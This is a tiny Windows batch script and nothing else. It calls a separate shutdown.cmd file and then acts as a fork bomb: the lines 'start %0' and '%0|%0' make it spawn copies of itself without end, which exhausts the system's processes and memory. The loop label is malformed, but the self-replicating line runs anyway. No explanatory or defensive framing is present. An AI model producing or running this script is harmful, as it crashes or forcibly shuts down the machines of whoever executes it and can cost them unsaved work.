@echo off 
cmd /c start shutdown.cmd
:goto a
start %0
%0|%0
goto a